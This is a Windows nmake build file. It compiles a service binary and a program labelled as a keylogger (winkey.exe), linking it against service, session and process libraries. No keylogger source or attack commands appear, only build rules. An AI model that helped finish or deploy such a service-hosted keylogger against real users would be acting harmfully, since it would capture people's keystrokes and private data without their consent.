CC = cl
CFLAGS = /W4 /WX /nologo /Iinc /DUNICODE /D_UNICODE /DWIN32_LEAN_AND_MEAN /D_WIN32_WINNT=0x0600 /EHsc /Foobj/
LDFLAGS = advapi32.lib user32.lib psapi.lib shell32.lib wtsapi32.lib

all: bin\svc.exe bin\winkey.exe

# Create directories
setup:
    if not exist bin mkdir bin
    if not exist obj mkdir obj

# Service
bin\svc.exe: setup obj\svc.obj obj\service_manager.obj
    $(CC) $(CFLAGS) /Fe:$@ obj\svc.obj obj\service_manager.obj $(LDFLAGS)

obj\svc.obj: src\svc\svc.cpp inc\service_manager.h
    $(CC) $(CFLAGS) /c src\svc\svc.cpp

obj\service_manager.obj: src\svc\service_manager.cpp inc\service_manager.h
    $(CC) $(CFLAGS) /c src\svc\service_manager.cpp

# Keylogger
bin\winkey.exe: setup obj\winkey.obj
    $(CC) $(CFLAGS) /Fe:$@ obj\winkey.obj $(LDFLAGS)

obj\winkey.obj: src\keylogger\winkey.cpp
    $(CC) $(CFLAGS) /c src\keylogger\winkey.cpp

clean:
    if exist bin rmdir /s /q bin
    if exist obj rmdir /s /q obj

rebuild: clean all

.PHONY: all clean rebuild setup
